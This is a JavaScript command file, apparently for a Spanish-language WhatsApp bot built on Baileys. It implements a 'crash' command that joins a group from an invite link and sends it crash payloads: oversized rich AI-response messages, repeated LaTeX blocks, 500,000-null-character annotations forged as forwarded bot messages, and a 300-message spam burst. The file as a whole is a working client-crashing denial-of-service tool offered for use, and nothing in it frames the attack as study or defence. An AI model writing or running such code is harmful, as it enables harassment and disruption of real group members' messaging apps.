import { AIRich } from "@whiskeysockets/baileys";

export default {
  name: ["crash"],
  description: "Entra a un grupo por enlace y lo traba",
  category: "owner",
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes("whatsapp.com")) {
      return reply({
        text:
          `💥 Pásame el enlace del grupo a crashear.\n` +
          `Ej: .${cmdName} https://chat.whatsapp.com/XXXX rich 10\n\n` +
          `Modos: rich [n] | latex [n] | nulls [n] | combo`,
      });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: "😡 Enlace inválido." });
    const code = match[1];

    const partes = text.split(/\s+/);
    const modo = (partes[1] || "rich").toLowerCase();
    const cant = parseInt(partes[2]) || 10; // cuántas bombas mandar

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: "⚠️ No pude leer el grupo. Enlace inválido o expirado." });
    }

    try { await sock.groupAcceptInvite(code); } catch {}
    await new Promise((r) => setTimeout(r, 2000)); // esperar propagación de membresía

    await reply({ text: `🧪 Crasheando ${groupId} → modo *${modo}* x${cant}` });

    // ---------- RICH BOMB x N en paralelo ----------
    if (modo === "rich") {
      const promesas = [];
      for (let b = 0; b < cant; b++) {
        const rich = new AIRich(sock);
        rich.setTitle(`💥 CRASH ${b + 1}`);
        for (let i = 0; i < 300; i++) {
          rich.addText(`Item ${i} [link](https://x.com) [](https://y.com) $x^2$`);
        }
        rich.addSuggest(["a","b","c","d","e","f","g","h","i","j"]);
        rich.setFooter("boom 💀");
        promesas.push(rich.send(groupId)); // sin await → todas en paralelo
      }
      await Promise.allSettled(promesas);
      return reply({ text: `✅ ${cant} rich enviados en paralelo.` });
    }

    // ---------- LATEX BOMB x N ----------
    if (modo === "latex") {
      const promesas = [];
      for (let b = 0; b < cant; b++) {
        const rich = new AIRich(sock);
        rich.setTitle(`∫ CRASH ${b + 1} ∫`);
        for (let i = 0; i < 300; i++) {
          rich.addText(`$\\int_{0}^{\\infty} e^{-x^2} dx = \\frac{\\sqrt{\\pi}}{2}$`);
        }
        promesas.push(rich.send(groupId));
      }
      await Promise.allSettled(promesas);
      return reply({ text: `✅ ${cant} latex enviados.` });
    }

    // ---------- NULLS x N ----------
    if (modo === "nulls") {
      const annotations = "\u0000".repeat(500000);
      const payload = {
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 0,
              submessages: [{ messageType: 7, mapMetadata: { annotations } }],
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardOrigin: 4,
                forwardedAiBotMessageInfo: { botJid: "0@bot" },
              },
            },
          },
        },
      };
      const promesas = [];
      for (let i = 0; i < cant; i++) {
        promesas.push(sock.relayMessage(groupId, payload, {}));
      }
      await Promise.allSettled(promesas);
      return reply({ text: `✅ ${cant} nulls enviados.` });
    }

    // ---------- COMBO ----------
    if (modo === "combo") {
      // 1) 5 rich en paralelo
      const richPromesas = [];
      for (let b = 0; b < 5; b++) {
        const rich = new AIRich(sock);
        rich.setTitle(`COMBO ${b + 1}`);
        for (let i = 0; i < 200; i++) {
          rich.addText(`Item ${i} [x](https://x.com) $x^2$`);
        }
        richPromesas.push(rich.send(groupId));
      }
      await Promise.allSettled(richPromesas);

      // 2) 10 nulls en paralelo
      const annotations = "\u0000".repeat(500000);
      const payload = {
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 0,
              submessages: [{ messageType: 7, mapMetadata: { annotations } }],
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardOrigin: 4,
                forwardedAiBotMessageInfo: { botJid: "0@bot" },
              },
            },
          },
        },
      };
      const nullPromesas = [];
      for (let i = 0; i < 10; i++) {
        nullPromesas.push(sock.relayMessage(groupId, payload, {}));
      }
      await Promise.allSettled(nullPromesas);

      // 3) ráfaga de 300 texto
      const spamPromesas = [];
      for (let i = 0; i < 300; i++) {
        spamPromesas.push(sock.sendMessage(groupId, { text: `💣 ${i + 1}/300` }));
      }
      await Promise.allSettled(spamPromesas);

      return reply({ text: "✅ combo terminado." });
    }

    return reply({ text: `Modo desconocido: *${modo}*` });
  },
};